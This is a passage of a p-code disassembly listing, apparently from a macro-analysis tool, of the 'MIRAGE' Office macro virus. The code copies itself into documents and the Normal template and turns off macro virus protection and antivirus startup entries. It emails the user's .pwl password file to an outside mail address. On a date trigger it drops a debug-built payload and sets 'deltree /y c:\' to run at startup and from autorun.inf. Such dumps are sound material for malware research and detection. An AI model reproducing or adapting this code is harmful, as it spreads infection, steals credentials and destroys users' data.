' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld CC 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #59:
' 	EndWith 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld wdOpenFormatDocument 
' 	Eq 
' 	IfBlock 
' Line #62:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	LineNum 1 
' 	BoS 0x0003 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #65:
' 	ArgsCall PSW_ 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	ArgsCall Document_New 0x0000 
' Line #70:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set BN 
' Line #71:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set mirage 
' Line #72:
' 	Ld mirage 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #73:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set mirage 
' Line #74:
' 	LitVarSpecial (True)
' 	St Wordz 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld mirage 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set GH 
' Line #77:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld GH 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "mirage:"
' 	Ne 
' 	IfBlock 
' Line #78:
' 	LitDI2 0x0000 
' 	Ld mirage 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #79:
' 	LitDI2 0x0000 
' 	Ld mirage 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld GH 
' 	MemLd CountOfLines 
' 	Ld GH 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #81:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld BN 
' 	MemLd CountOfLines 
' 	Ld BN 
' 	ArgsMemLd Lines 0x0002 
' 	Ld GH 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	SetStmt 
' 	LitNothing 
' 	Set GH 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld Wordz 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld mirage 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #85:
' 	ArgsCall PSW_ 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Private Sub Document_Close())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #90:
' 	ArgsCall Document_New 0x0000 
' Line #91:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #92:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St False 
' Line #93:
' 	Ld False 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St YYY 
' Line #94:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	Else 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #95:
' 	LineNum 1 
' 	BoS 0x0003 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "mirage:"
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x005D 0x0007 " GoTo 2"
' Line #96:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NN 
' Line #97:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #98:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld NN 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #99:
' 	EndWith 
' Line #100:
' 	StartForVariable 
' 	Ld P 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #101:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0042 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	St L 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0039 
' 	LitDI2 0x0031 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0030 
' 	Add 
' 	FnInt 
' 	St z 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0062 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	St S 
' Line #102:
' 	Ld GenPas 
' 	Ld L 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld z 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld S 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St GenPas 
' Line #103:
' 	StartForVariable 
' 	Next 
' Line #104:
' 	LitDI2 0x0001 
' 	LitStr 0x0001 "'"
' 	Ld GenPas 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld YYY 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #107:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #108:
' 	LitDI2 0x0001 
' 	LitStr 0x0001 "'"
' 	Ld GenPas 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall replaceline 0x0002 
' 	BoS 0x0000 
' 	End 
' Line #109:
' 	LineNum 2 
' 	BoS 0x0003 
' 	LitDI2 0x0002 
' 	LitDI2 0x0000 
' 	Ld YYY 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Private Sub PSW_())
' Line #112:
' 	OnError (Resume Next) 
' Line #113:
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x0006 "MIRAGE"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0006 "MIRAGE"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #114:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set oa 
' Line #115:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld oa 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set mn 
' Line #116:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld oa 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set PSW 
' Line #117:
' 	Ld oa 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #118:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld mn 
' 	ArgsMemCall Logon 0x0002 
' Line #119:
' 	LitStr 0x000C "btr7@mail.ru"
' 	Ld PSW 
' 	MemSt BCC 
' Line #120:
' 	LitStr 0x0005 "Fwd: "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld PSW 
' 	MemSt Subject 
' Line #121:
' 	LitStr 0x000D "Fresh thieved"
' 	Ld PSW 
' 	MemSt Body 
' Line #122:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".pwl"
' 	Concat 
' 	Ld PSW 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #123:
' 	Ld PSW 
' 	ArgsMemCall Send 0x0000 
' Line #124:
' 	Ld mn 
' 	ArgsMemCall Logoff 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	LitStr 0x0006 "MIRAGE"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x0006 "MIRAGE"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Private Sub Trojan())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.scr"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "N VIRUS.BMP"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 42 4D 76 02 00 00 00 00 00 00 76 00 00 00 28 00"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 00 00 20 00 00 00 20 00 00 00 01 00 04 00 00 00"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 00 00 00 02 00 00 C4 0E 00 00 C4 0E 00 00 00 00"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 80"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 00 00 00 80 80 00 80 00 00 00 80 00 80 00 80 80"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 00 00 C0 C0 C0 00 80 80 80 00 00 00 FF 00 00 FF"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 00 00 00 FF FF 00 FF 00 00 00 FF 00 FF 00 FF FF"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 00 00 FF FF FF 00 99 99 99 99 99 99 99 99 99 99"
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 99 99 99 99 99 99 99 99 00 09 90 09 00 90 09 90"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 00 99 00 00 09 99 99 99 00 09 90 09 00 90 09 00"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 00 09 99 90 09 99 99 90 09 00 90 09 00 00 99 00"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 90 09 00 00 09 99 99 90 09 00 90 09 00 90 09 00"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 90 09 00 99 99 99 99 90 09 00 90 09 00 00 99 00"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 90 09 00 00 09 99 99 99 99 99 99 99 99 99 99 99"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 99 99 99 99 99 99 99 99 99 99 90 00 00 00 00 00"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 00 99 99 99 99 99 99 99 99 90 00 BB BB BB BB BB"
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 B0 00 99 99 99 99 99 99 99 00 BB BB BB 00 0B BB"
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 BB B0 00 99 99 99 99 99 99 0B BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 BB BB B0 09 99 99 99 99 00 BB BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 BB BB BB 00 99 99 99 99 0B BB BB B0 00 00 00 00"
' 	PrintItemNL 
' Line #152:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 BB BB BB B0 99 99 99 99 0B BB B0 00 F0 F0 F0 F0"
' 	PrintItemNL 
' Line #153:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 00 BB BB B0 99 99 99 90 0B 0B 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 00 0B 0B B0 99 99 99 90 0B B0 B0 00 F0 F0 F0 F0"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 00 B0 BB B0 99 99 99 90 BB BB 0B B0 00 00 00 00"
' 	PrintItemNL 
' Line #156:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 BB 0B BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 BB BB BB B0 99 99 99 90 BB BB BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 BB BB BB 00 99 99 99 99 0B B0 00 00 BB BB BB 00"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 00 0B BB 09 99 99 99 99 0B B0 FF F0 0B BB B0 0F"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 FF 0B BB 09 99 99 99 99 0B B0 FF FF 00 BB 00 FF"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 FF 0B B0 09 99 99 99 99 00 B0 FF F0 0B BB B0 0F"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 FF 0B B0 99 99 99 99 99 90 00 00 00 BB BB BB 00"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 00 0B B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 BB BB B0 99 99 99 99 99 99 0B BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 BB BB B0 99 99 99 99 99 99 00 BB BB BB BB BB BB"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 BB BB B0 99 99 99 99 99 99 90 00 00 00 0B BB BB"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 BB BB 09 99 99 99 99 99 99 99 99 99 00 0B BB BB"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 BB B0 99 99 99 99 99 99 99 99 99 99 99 00 00 00"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 00 09 99 99 99 99 99 99 99 99 99 99 99 99 99 99"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "E 0370 99 99 99 99 99 99"
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "276"
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #177:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	ArgsCall ChDir 0x0001 
' Line #178:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "debug < virus.scr"
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #182:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.bat"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #183:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.bmp"
' 	Concat 
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #184:
' 	LitStr 0x0001 "2"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x000E "WallpaperStyle"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #185:
' 	LitStr 0x0010 "Virus MIRAGE !!!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #186:
' 	LitStr 0x0009 "Adieus!!!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x000F "LegalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #187:
' 	LitStr 0x000E "deltree /y c:\"
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0006 "MIGAGE"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #188:
' 	LitStr 0x000E "Deltree /Y C:\"
' 	LitStr 0x000E "C:\Autorun.inf"
' 	LitStr 0x0007 "Autorun"
' 	LitStr 0x0004 "Open"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #189:
' 	LitStr 0x000E "C:\Autorun.inf"
' 	LitDI2 0x0002 
' 	LitDI2 0x0004 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #190:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn c
' Line #191:
' 	LitDI2 0x0005 
' 	St a 
' Line #192:
' 	Ld Timer 
' 	St B 
' Line #193:
' 	Ld Timer 
' 	Ld B 
' 	Ld a 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #194:
' 	ArgsCall DoEvents 0x0000 
' Line #195:
' 	Loop 
' Line #196:
' 	Ld Timer 
' 	St c 
' Line #197:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.scr"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #198:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0009 "virus.bat"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #199:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #200:
' 	EndSub 
' Line #201:
' 	FuncDefn (Private Sub Document_New())
' Line #202:
' 	OnError (Resume Next) 
' Line #203:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #204:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #205:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #206:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #207:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #208:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #209:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #210:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #211:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #212:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #213:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #214:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0058 "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #215:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0005 "AVPCC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #216:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0048 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
' 	LitStr 0x000D "AVPCC Service"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #217:
' 	LitStr 0x001F "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeBackColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #218:
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeForeColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #219:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	If 
' 	BoS 0x0000 
' 	ArgsCall (Call) Trojan 0x0000 
' 	BoS 0x0000 
' 	End 
' 	EndIf 
' Line #220:
' 	OnError qw 
' Line #221:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "mirage:"
' 	Eq 
